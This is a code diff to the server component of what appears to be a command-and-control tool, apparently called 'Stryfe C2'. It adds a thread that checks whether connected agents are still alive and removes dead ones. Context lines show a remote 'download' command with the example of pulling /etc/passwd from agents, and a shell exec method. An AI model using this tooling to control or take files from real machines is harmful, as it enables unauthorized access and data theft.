@@ -2,6 +2,7 @@ import socket, threading, ssl
 import secrets, os, platform, json
 from agent import Agent
 from symbols import *
+import select
 
 class Server:
                                                                       
@@ -15,12 +16,12 @@ class Server:
         self.stop_event = threading.Event() # Test to stop threads
         self.current_agent = Agent(['',''],'',0) # Dummy agent for initialisation
         self.banner = """
-                ███████╗████████╗██████╗ ██╗   ██╗███████╗███████╗     ██████╗██████╗ 
-                ██╔════╝╚══██╔══╝██╔══██╗╚██╗ ██╔╝██╔════╝██╔════╝    ██╔════╝╚════██╗
-                ███████╗   ██║   ██████╔╝ ╚████╔╝ █████╗  █████╗      ██║      █████╔╝
-                ╚════██║   ██║   ██╔══██╗  ╚██╔╝  ██╔══╝  ██╔══╝      ██║     ██╔═══╝ 
-                ███████║   ██║   ██║  ██║   ██║   ██║     ███████╗    ╚██████╗███████╗
-                ╚══════╝   ╚═╝   ╚═╝  ╚═╝   ╚═╝   ╚═╝     ╚══════╝     ╚═════╝╚══════╝
+        ███████╗████████╗██████╗ ██╗   ██╗███████╗███████╗     ██████╗██████╗ 
+        ██╔════╝╚══██╔══╝██╔══██╗╚██╗ ██╔╝██╔════╝██╔════╝    ██╔════╝╚════██╗
+        ███████╗   ██║   ██████╔╝ ╚████╔╝ █████╗  █████╗      ██║      █████╔╝
+        ╚════██║   ██║   ██╔══██╗  ╚██╔╝  ██╔══╝  ██╔══╝      ██║     ██╔═══╝ 
+        ███████║   ██║   ██║  ██║   ██║   ██║     ███████╗    ╚██████╗███████╗
+        ╚══════╝   ╚═╝   ╚═╝  ╚═╝   ╚═╝   ╚═╝     ╚══════╝     ╚═════╝╚══════╝
 """
 
         self.commands = {
@@ -84,6 +85,9 @@ class Server:
                 'description': 'Download the specified files | FILE: String | Ex: download /etc/passwd /etc/hosts'
             }
         }
+
+        self.agent_checker_thread = threading.Thread(target=self.checkAgents)
+        self.agent_checker_thread.start()
 
     def __str__(self):
         return f"Server: {len(self.agents)} agents connected"
@@ -344,3 +348,26 @@ class Server:
 
     def exec(self, args):
         os.system(args)
+    
+    def isSocketAlive(self, sock):
+        """Check if the agents are still alive by checking the readability of the socket"""
+        try:
+            sock.settimeout(0.5)
+            # Passing the socket we want to check for readability in first argument with a timeout of 0.5 seconds
+            read_ready, _, _ = select.select([sock], [], [], 0.5)
+            if read_ready:
+                data = sock.recv(1)
+                if data == b'':
+                    return False
+            return True
+        except:
+            return False
+
+    def checkAgents(self):
+        """Kill the agents if we can't contact them"""
+        while True:
+            for agent in self.agents:
+                if not self.isSocketAlive(agent.sock):
+                    print(f"\nAgent {agent.id} died ({agent.ip})")
+                    self.killAgent(agent.id)
+            self.stop_event.wait(2)
